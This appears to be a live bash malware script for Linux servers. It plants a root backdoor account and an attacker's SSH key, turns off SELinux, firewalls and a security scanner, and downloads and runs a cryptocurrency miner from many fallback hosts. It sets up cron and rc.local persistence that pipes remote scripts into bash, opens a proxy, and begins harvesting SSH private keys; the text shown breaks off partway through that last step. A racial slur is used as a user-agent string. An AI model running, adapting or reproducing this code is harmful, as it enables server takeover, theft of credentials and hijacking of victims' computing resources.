#!/bin/bash
#thanks for everything
# __   _____  _   _   _  _   ___   _____   ___   _      ___   ___   __
# \ \ / / _ \| | | | | || | /_\ \ / / __| |   \ /_\    / __| /_\ \ / /
#  \ V / (_) | |_| | | __ |/ _ \ V /| _|  | |) / _ \  | (_ |/ _ \ V / 
#   |_| \___/ \___/  |_||_/_/ \_\_/ |___| |__/_/ \_\  \___/_/ \_\ |  
#                                                                /_|                                                                 
resetsshgo(){
if [ "$needreset" -eq "0" ]; 
then
echo "no need"
else
sleep 10;
/etc/init.d/ssh restart;
/etc/init.d/sshd restart;
/etc/rc.d/sshd restart;
service ssh restart;
service sshd restart;
systemctl start ssh;
systemctl restart ssh;
scw-fetch-ssh-keys --upgrade;
fi
}

sshaddusergo() {
if id "system" 2>/dev/null; then
echo ""
else
userdel darmok;
useradd -m -p '3PvxD3qO8Hx1c' system;
usermod -aG sudoers system;
usermod -aG root system;
adduser system sudo;
echo "system    ALL=(ALL)       ALL" >> /etc/sudoers
sed -i '/.PermitRootLogin*/d' /etc/ssh/sshd_config
sed -i '/PermitRootLogin*/d' /etc/ssh/sshd_config
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
needreset=1;
fi
}

filegetgo(){
echo "hello thanks for the script :)";
chattr -iau /var/tmp || chattr -iau /tmp
sysctl -w vm.nr_hugepages=$(nproc --all);
mkdir -p /tmp/bbp ; mkdir /var/tmp/bbp
curl -sL -o /tmp/kkk http://205.185.113.35/files/lifxvf; chmod +x /tmp/kkk ; /tmp/kkk ; rm -rf /tmp/kkk
echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled;
curl -sL -o /var/tmp/bbp/config.json http://205.185.113.35/files/tcazmp.jpg || curl -sL -o /tmp/bbp/config.json http://205.185.113.35/files/tcazmp.jpg;
if md5sum --status -c - <<<"09fb943f706ae0e3a8ceb2e5d9740dc0 /var/tmp/bbp/config.json" || md5sum --status -c - <<<"09fb943f706ae0e3a8ceb2e5d9740dc0 /tmp/bbp/config.json"
then
echo "correct"
else
curl -sL -o /var/tmp/bbp/config.json https://goload.ru/files/goload_6476_1575522349.jpg || curl -sL -o /tmp/bbp/config.json https://goload.ru/files/goload_6476_1575522349.jpg;
if md5sum --status -c - <<<"09fb943f706ae0e3a8ceb2e5d9740dc0 /var/tmp/bbp/config.json" || md5sum --status -c - <<<"09fb943f706ae0e3a8ceb2e5d9740dc0/tmp/bbp/config.json"
then
echo "correct"
else
curl -sL -o /var/tmp/bbp/config.json https://filebin.net/csshic00eqfl625d/new.jpg?t=bpadhjf3 || curl -sL -o /tmp/bbp/config.json https://filebin.net/csshic00eqfl625d/new.jpg?t=bpadhjf3;
if md5sum --status -c - <<<"09fb943f706ae0e3a8ceb2e5d9740dc0 /var/tmp/bbp/config.json" || md5sum --status -c - <<<"09fb943f706ae0e3a8ceb2e5d9740dc0 /tmp/bbp/config.json"
then
echo "correct"
else
curl -sL -o /var/tmp/bbp/config.json http://uupload.ir/files/na85_new.jpg || curl -sL -o /tmp/bbp/config.json http://uupload.ir/files/na85_new.jpg;
if md5sum --status -c - <<<"09fb943f706ae0e3a8ceb2e5d9740dc0/var/tmp/bbp/config.json" || md5sum --status -c - <<<"09fb943f706ae0e3a8ceb2e5d9740dc0 /tmp/bbp/config.json"
then
echo "correct"
else
curl -sL -o /var/tmp/bbp/config.json https://goload.ru/files/goload_4390_1575945720.jpg || curl -sL -o /tmp/bbp/config.json https://goload.ru/files/goload_4390_1575945720.jpg;
if md5sum --status -c - <<<"09fb943f706ae0e3a8ceb2e5d9740dc0/var/tmp/bbp/config.json" || md5sum --status -c - <<<"09fb943f706ae0e3a8ceb2e5d9740dc0 /tmp/bbp/config.json"
then
echo "correct"
else
curl -sL -o /var/tmp/bbp/config.json http://205.185.115.72/config.json || curl -sL -o /tmp/bbp/config.json http://205.185.115.72/config.json;
fi
fi
fi
fi
fi
urldirect1=""
urldirect2="https://s.put.re/"
urldirect3="https://linx.li/s/"
urldirect4="https://up.nerde.pw/selif/"
urldirect5="https://junglecoder.com/linx/selif/"
urldirect6="https://so.urceco.de/selif/"
urldirect7="https://fs.ikl.sh/selif/"
urldirect8="https://share.dev0.sh/selif/"
urldirect9="http://uupload.ir/files/"
urlscrape1="https://anonfiles.com/"
urlscrape2="https://share-online.is/"
urlscrape3="https://myfile.is/"
urlscrape4="https://rapidshare.nu/"
urlscrape5="https://upload.st/"
urlscrape6="https://file.bz/"
urlscrape7="https://letsupload.cc/"
urlscrape8="https://fuskbugg.se/"
directarray1=()
directarray2=("AcRbDzHC.jpg" "wNQb1njt.jpg" "pXetZsaW.jpg" "VjPEWGsk.jpg" "a6GmLbjb.jpg" "TuNA9oqt.jpg" "QoeH4stq.jpg" "c2Fsjg3a.jpg" "43XNPL95.jpg" "8odQGnMx.jpg" "8ozu7D4u.jpg" "C4woEGn4.jpg" "YwVToqXc.jpg" "F66bhokC.jpg" "kX36DCLJ.jpg" "vr3uksvA.jpg" "KHq8XsSf.jpg" "4QJBxTkL.jpg" "Vk75Gpdd.jpg" "whaWFZbX.jpg")
directarray3=("vh7jgqda.jpg" "51wqkrzf.jpg" "0y96i6r3.jpg" "92m68yn0.jpg" "oz8gffce.jpg" "xz9ver52.jpg" "vszyhtlo.jpg" "3vorlsof.jpg" "x464bmyh.jpg" "1wn5sjgi.jpg" "504xvir3.jpg" "qbhhx8jt.jpg" "4kc0x30m.jpg" "xo0czrnc.jpg" "e7bq6gov.jpg" "oay9zcom.jpg" "i8bo9g0e.jpg" "ar2h5i5i.jpg" "yeyii8sb.jpg" "rg991e3o.jpg")
directarray4=("28gqdic2.jpg" "463lt6o5.jpg" "2g1d19fy.jpg" "aknrg7b6.jpg" "ql5g92kw.jpg" "2ckzymod.jpg" "vfv30qum.jpg" "hnw1v0or.jpg" "fn79tf4y.jpg" "bmzwju5c.jpg" "t35bg5us.jpg" "1bm7lab3.jpg" "n6n63wm6.jpg" "b3dnupoz.jpg" "sfrjr8cj.jpg" "fjcj2hjd.jpg" "83f8ceph.jpg" "jlyd18zv.jpg" "o1ernrbu.jpg" "iiczqu1o.jpg")
directarray5=("a54v1t8v.file" "3tyfylw0.file" "qg2835kn.file" "1crd48rn.file" "4x6hq0nk.file" "63s2cl1n.file" "q5tj1q8q.file" "doli3rtr.file" "arbsqgno.file" "pll7l46n.file" "i0xrbsal.file" "x1tpgnc9.file" "5ukpoep5.file" "p3b913tz.file" "3qae42b7.file" "l1ytxkl1.file" "2y9kzh5v.file" "c6afohpe.file" "gwk77wyw.file" "fhthykey.file")
directarray6=("2rhw89y3.jpg" "roiuwr27.jpg" "gkq2f70v.jpg" "rfust8yv.jpg" "v3q4w0bf.jpg" "pckqx5vk.jpg" "0oso0g8x.jpg" "rsb3dtux.jpg" "9vghk7ox.jpg" "c4rlmoam.jpg" "97lycgks.jpg" "hljjrsq7.jpg" "d9bet2ek.jpg" "u6hrfpum.jpg" "few7oyax.jpg" "ip1gbtxq.jpg" "o5ud9ulk.jpg" "uoyidjbw.jpg" "4cw5r0qf.jpg" "eklup7oz.jpg")
directarray7=("ywtm4i58.jpg" "kr8fggiw.jpg" "pjgr3fc1.jpg" "oootb4z1.jpg" "6ny0ahyt.jpg" "3ju265c8.jpg" "95xn9b5g.jpg" "rrngmswt.jpg" "nzzayq5k.jpg" "gnea1g25.jpg" "f652awt0.jpg" "ir599zbt.jpg" "xx2xysot.jpg" "lbp90uda.jpg" "hyqje4iw.jpg" "c5mudh5x.jpg" "omt2cobn.jpg" "336yfadt.jpg" "ct4atkmb.jpg" "d24rt78d.jpg")
directarray8=("eha7jz9a.elf" "cy17gh5q.elf" "oqnbr34y.elf" "nudfxbjx.elf" "5qk7iklu.elf" "dquq70rd.elf" "gu58v9fk.elf" "1ui9zdxu.elf" "0kxjny09.elf" "s7njp6yw.elf" "787arv0d.elf" "eub16ghi.elf" "4yuldx99.elf" "o79d4luc.elf" "ev92sjev.elf" "viaqsrfj.elf" "k7xuw07a.elf" "81o5y14b.elf" "cirvsu8a.elf" "i4pxkpyj.elf")
directarray9=("pzab_bbp.jpg" "qk0y_bbp.jpg" "cfw2_bbp.jpg" "skb7_bbp.jpg")
scrapearray1=("34e1b7D5nf" "l5f9b0D2nf" "V3feb5D2na" "R1g6b8Ddn3" "J3h6b4Dan1" "B2icbaD1n9" "x0jfb2D4n9" "j7kfbaDfn5" "V8k4bdD7nb" "J3l1bfD6na" "z4m4baDdn0" "z2neb7D7nd" "Z0ndbdD8nc" "R9o1bfDbn7" "H7pebaD7ne" "B1q5b4D5na" "F2rebbDfne" "7bt5bcD4n6" "Hau9b2D8nf" "Xfvdb4D5n1")
scrapearray2=("52e7b1D1nd" "ndf3b8D2nf" "d6gab9D5nc" "VcgbbeDanc" "Lahcb7Dbna" "D8i0b9D3nd" "16j7b5D5n6" "nck3bdD9nf" "XdkabcD4nb" "L9l1bfD8nb" "1cmdb5Dcnf" "13n2b7D1n7" "b8oab7D1n7" "Tao5beD7ne" "J6pebcDbn2" "D0qbb4D0n0" "P3r4b9Ddn8" "Hdtdb6D5nf" "L0udb7D2n6" "ddwcb4D8n3")
scrapearray3=("7befb8Dbnc" "p2fbb1D2nc" "f1g0b3Dana" "Z9g6bfD4n1" "P8h0b7D7n5" "Ffi9bbDcnd" "3bjeb6D3n9" "r7k8b8D6n3" "bfl4b2D1ne" "Nfl5bdD5nd" "51m2b4D0ne" "51n4b7D6ne" "d5oab4D0n4" "Vdoab8Den1" "L2pfb4Dcn6" "Fcq7b0Dfn5" "R6rcb1Dcn9" "J1tbb9Dana" "V6uabeD0nf" "f1web5D5ne")
scrapearray4=("9febb4D4n3" "rcf4bfDfne" "j6gcbdDcn0" "b8h6b8D9n0" "R9hebbD1n3" "H2i2b1D6n9" "53j9b5D4n5" "t5k4b9D4n1" "ffl9bbD5n5" "R0l9b0D2n9" "71m2b9D6n2" "7en3b5Dan2" "j2o8bbD4n0" "Xbodb0Dfn0" "P8p4bcDan1" "Haq4bfD4n8" "T4r2b2Ddnc" "N4t2b5Dbne" "XeudbeDfn3" "j1wfbcDan7")
scrapearray5=("B3e9b3D7nd" "tdfdbdD4n0" "lbgcbbD0n0" "d9hdb7D1n9" "T5hab0D2nb" "J4idb0Dbnf" "9ejabdD2n3" "v5k0b7D4nb" "h1l2b6Den8" "Tal1b5D3n3" "9fmab4Dbn5" "9fn1b0D1n6" "l8o2b1D5n2" "Z1o0b1D0n4" "R4pfbfD5n9" "Jbq2bbD3ne" "X4r4b2D7na" "P7t7bdDfn9" "Z0u5bcD4n1" "ldw4bfD0n6")
scrapearray6=("Dee7baDfn4" "v1f6b0D0nc" "n3gbbeDcnf" "fch2b6Den0" "b0i5b8Dan7" "Nbibb1D2nc" "B7j8b3Dana" "x8k6b1D6n6" "j0l6b1D4n7" "V2l2b5D2n3" "BamebdDcnc" "Bfn6b4D0n2" "n1o0beD1n4" "ddp2b8Dbne" "T6p3b7Danb" "N1qfb4D9n3" "Z1rcb8Dfne" "T2t5b5Dan4" "b3v6b4D3nb" "55w4bfD0n9")
scrapearray7=("F9e6bdD6na" "xefbbaDen2" "p3g6bdD4ne" "hbh6b5Den9" "d4i4bcD6n1" "Pbi0b2Dfnb" "Fej7b5Dcn7" "14k0bfD6nd" "n2l3beDfn0" "Xdldb5Dcnd" "FamabaDen5" "D3n9beD1n4" "pbo3bcDcn6" "fcpab2D8n9" "Vepeb2Dfn4" "Rbq9b2Dane" "b7scbdD7nd" "V5tcb3Ddn3" "dcveb4D8n9" "J1wcb6D9nf")
scrapearray8=("T7e7bbDfne" "7dfdbcD1n3" "53g2b0D6na" "xeh6b4Danf" "p0i5b1Ddn5" "b5jabfDbn2" "Tfj7b2Dcnf" "Bakab1Dcnf" "11l0b9D8n1" "lam2b6D8n9" "Z9mabfDfn7" "N0nbbbDdn9" "30o7bdD2n2" "r2p5b2Den5" "leq0bbDcn2" "bbr5b1D9n3" "r8s0b4D2nf" "lcu1b1Dan3" "r8vfbbD5n7" "b4x4b3D1ne")

curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect2${directarray2[$RANDOM % ${#directarray2[@]}]} || curl ---create-dirs sL -o /tmp/bbp/bbp $urldirect1${directarray1[$RANDOM % ${#directarray1[@]}]};
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp || /tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect2${directarray2[$RANDOM % ${#directarray2[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect2${directarray2[$RANDOM % ${#directarray2[@]}]};
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp || /tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect3${directarray3[$RANDOM % ${#directarray3[@]}]} || curl ---create-dirs sL -o /tmp/bbp/bbp $urldirect3${directarray3[$RANDOM % ${#directarray3[@]}]};
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp || /tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect4${directarray4[$RANDOM % ${#directarray4[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect4${directarray4[$RANDOM % ${#directarray4[@]}]};
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect5${directarray5[$RANDOM % ${#directarray5[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect5${directarray5[$RANDOM % ${#directarray5[@]}]};
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect6${directarray6[$RANDOM % ${#directarray6[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect6${directarray6[$RANDOM % ${#directarray6[@]}]};
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect7${directarray7[$RANDOM % ${#directarray7[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect7${directarray7[$RANDOM % ${#directarray7[@]}]};
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect8${directarray8[$RANDOM % ${#directarray8[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect8${directarray8[$RANDOM % ${#directarray8[@]}]};
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $urldirect9${directarray9[$RANDOM % ${#directarray9[@]}]} || curl --create-dirs -sL -o /tmp/bbp/bbp $urldirect9${directarray9[$RANDOM % ${#directarray9[@]}]};
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape1${scrapearray1[$RANDOM % ${#scrapearray1[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape1${scrapearray1[$RANDOM % ${#scrapearray1[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp ||chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape2${scrapearray2[$RANDOM % ${#scrapearray2[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape2${scrapearray2[$RANDOM % ${#scrapearray2[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape3${scrapearray3[$RANDOM % ${#scrapearray3[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape3${scrapearray3[$RANDOM % ${#scrapearray3[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape4${scrapearray4[$RANDOM % ${#scrapearray4[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape4${scrapearray4[$RANDOM % ${#scrapearray4[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape5${scrapearray5[$RANDOM % ${#scrapearray5[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape5${scrapearray5[$RANDOM % ${#scrapearray5[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape6${scrapearray6[$RANDOM % ${#scrapearray6[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape6${scrapearray6[$RANDOM % ${#scrapearray6[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp 
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape7${scrapearray7[$RANDOM % ${#scrapearray7[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape7${scrapearray7[$RANDOM % ${#scrapearray7[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
else
curl --create-dirs -sL -o /var/tmp/bbp/bbp $(curl -sL $urlscrape8${scrapearray8[$RANDOM % ${#scrapearray8[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1) || curl --create-dirs -sL -o /tmp/bbp/bbp $(curl -sL $urlscrape8${scrapearray8[$RANDOM % ${#scrapearray8[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
if md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /var/tmp/bbp/bbp" || md5sum --status -c - <<<"72e3f8762f4d35fde98afcaf684eaa86 /tmp/bbp/bbp"
then
chmod +x /var/tmp/bbp/bbp || chmod +x /tmp/bbp/bbp
/var/tmp/bbp/bbp
else
echo "when the walls fell!!!!" 
curl -A nigger/1.2 -Lo /opt/bbp http://205.185.113.35/files/adnckil
chmod +x /opt/bbp
/opt/bbp -o 37.9.3.26:80 -u 41vq9FidW6cboPWvuc1z4ZaBDmgvU3iwvSJiTAy3RSFPTfcqq6CPdQ8cqhVhVL3VfNKBr9nnAS3DuGCfWLkViUc1K8gBgyZ -p daddy -B
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
}

sshkeysgo(){
if [ -f "/root/.ssh/authorized_keys" ]
then
echo ""
else
needreset=1;
mkdir -p /root/.ssh
echo "" >> /root/.ssh/authorized_keys
fi
cat /etc/ssh/sshd_config | grep -iw "#Port 22" | grep -v grep >/dev/null
if [ $? -eq 1 ]
then
echo ""
else
needreset=1;
sed -i 's/#Port 22/Port 22/g' /etc/ssh/sshd_config
fi
cat /etc/ssh/sshd_config | grep -iw "port 48" | grep -v grep >/dev/null
if [ $? -eq 0 ]
then
echo ""
else
needreset=1;
echo "" > /etc/hosts.deny;
echo "" > /etc/hosts.allow;
chattr -iau /etc/ssh/sshd_config
chmod 777 /etc/ssh/sshd_config
echo "Port 48" >> /etc/ssh/sshd_config;
chmod 555 /etc/ssh/sshd_config
fi
cat /root/.ssh/authorized_keys | grep -iw "AAAAB3NzaC1yc2EAAAABJQAA" | grep -v grep >/dev/null
if [ $? -eq 0 ]
then
echo ""
else
needreset=1;
mkdir -p /root/.ssh
chmod 777 /root/.ssh/authorized_keys;
chattr -iau /root/.ssh/authorized_keys;
echo -e "\n" >> /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAsVxCjJ6yfHxS/ZzFj5JM+yfeCh3330CeM0EGxNRgTqAp1/WYAEQD7rJw8LX1D77kVCqK03Gm/AHeOgKIs5cjRndekfa9rr2kwrnEkmAAgslVa/414LvtPSOLXdEoKCT9Upoi/G+3vP6fFaKEh3OF7I0lRKSbU1q2aBbmU7NA7k1qk1SHM53FYxmhHLen6GQeEa6RrO6nVul9M9bGX6zf5Dp34NXp8YXH5hVCuuWjzaiIi80LqAEQ3kp26KAtO0OGvT8evVZ33Q038ABiECHT1o9odVMTXw1qbeMvwRA/RJOmZZK38peLgpxXpWTlJ7ETtst63Qh9XfEg83DtNfd7Tw== system@localhost" >> /root/.ssh/authorized_keys
sed -i '/.PermitRootLogin*/d' /etc/ssh/sshd_config
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
chmod 555 /root/.ssh/authorized_keys
fi
}

securitygo() {
craigrowland=$(find /usr -name sandfly-filescan)
for klingon in $craigrowland
do
chattr -iua $klingon
rm -rf $klingon
done
needreset=0;
setenforce 0;
ufw disable;
iptables -F;
iptables -X;
iptables -t nat -F;
iptables -t nat -X;
iptables -t mangle -F;
iptables -t mangle -X;
iptables -P INPUT ACCEPT;
iptables -P FORWARD ACCEPT;
iptables -P OUTPUT ACCEPT;
iptables -A INPUT -s 66.172.11.0/24 -j DROP
iptables -A INPUT -s 104.140.201.0/24 -j DROP
iptables -A OUTPUT -s 104.140.201.0/24 -j DROP
curl -sL http://205.185.113.35/files/sesa.txt | bash -s 2>/dev/null;
}

filesetupgo(){
chattr -iauR /var/tmp/bbp/
chattr -iauR /tmp/bbp/
mount | grep noexec | grep /tmp | grep -vw grep
if [ $? -eq 1 ]
then
echo "good to go";
else
echo "remounting"
mount -o remount,exec /var/tmp
mount -o remount,exec /tmp
fi
j=0; for i in `ps -fe| grep 'bbp/bbp' | grep -v grep | grep -v http | awk '{print $2}'`; do let j=j+1; if [ $j -ge 2 ]; then echo "Killing process $i"; kill -9 $i; fi done;
ps -fe | grep -w bbp/bbp | grep -v grep | grep -v http
if [ $? -eq 0 ]
then
echo "RUNNING";
curl -A nigger/1.2 -4sL https://iplogger.org/109S93 >/dev/null;
else
mkdir -p /var/tmp/bbp
mkdir -p /tmp/bbp/
filegetgo
fi
}
persistgo(){
crontab -l | grep -e "1Sp9r7"| grep -v grep
if [ $? -eq 0 ]
then
echo "cron good"
else
crontab -r
chattr -aui /var/spool/cron/root
mkdir -p /etc/cron.d
mkdir -p /var/spool/cron
echo "0,30 * * * * curl -sL http://205.185.113.35/files/alduro | bash -s" >> ~/cron || true && \
echo "0,45 * * * * curl -sL http://205.185.113.35/files/sesa.txt | bash -s" >> ~/cron || true && \
echo "0 * * * * curl -A cron/1.2 -sL https://iplogger.org/1Sp9r7" >> ~/cron || true && \
crontab -u root ~/cron || true && \
crontab ~/cron || true && \
anacron -t ~/cron
rm -rf ~/cron
rm -rf ~/cron
rm -rf ~/cron
chattr +ia /var/spool/cron/root
fi
cat /etc/rc.local | grep -vw grep | grep "alduro"
if [ $? -eq 0 ]
then
echo ""
else
echo "curl -sL http://205.185.113.35/files/alduro | bash ">>/etc/rc.local
fi
}

filerungo(){
mkdir /opt/bbp
curl -A nigger/1.2 -Lo /opt/bbp/bbp http://205.185.113.35/files/adnckil
curl -A nigger/1.2 -Lo /opt/bbp/config.json http://205.185.113.35/files/iqmjlf.jpg
chmod +x /opt/bbp/bbp
chattr -iauR /var/tmp/bbp/
chattr -iauR /tmp/bbp/
chattr -iauR /opt/bbp/bbp
curl -sL https://raw.githubusercontent.com/fengyouchao/pysocks/master/socks5.py  | python - start --port=5710 --log=false;
ps aux | grep -vw bbp/bbp | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
ps -fe | grep -w bbp/bbp | grep -v grep | grep -v http
if [ $? -eq 0 ]
then
echo "RUNNING"
else
sysctl -w vm.nr_hugepages=$(nproc --all)
echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
chmod +x /opt/bbp/bbp
/opt/bbp/bbp
sleep 10s;
ps -fe | grep -w bbp/bbp | grep -v grep | grep -v http
if [ $? -eq 0 ]
then
echo "NOW RUNNING"
else
sysctl -w vm.nr_hugepages=$(nproc --all)
echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
/tmp/bbp/bbp -c /tmp/bbp/config.json || /var/tmp/bbp/bbp -c /var/tmp/bbp/config.json
fi
fi
}

localgo(){
myhostip=$(curl -sL icanhazip.com)
KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep IdentityFile|awk -F "IdentityFile" '{print $2 }')
KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)"|awk -F ' -i ' '{print $2}'|awk '{print $1'})
